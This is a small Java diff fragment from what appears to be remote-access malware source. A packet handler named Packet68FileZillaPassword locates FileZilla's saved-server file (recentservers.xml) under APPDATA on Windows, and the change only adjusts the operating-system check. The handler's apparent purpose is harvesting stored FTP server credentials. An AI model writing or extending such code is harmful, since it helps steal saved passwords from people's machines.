@@ -22,7 +22,7 @@ public class Packet68FileZillaPassword extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		File file = null;
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			file = new File(System.getenv("APPDATA") + "\\FileZilla\\recentservers.xml");
 
 			if (file.exists()) {
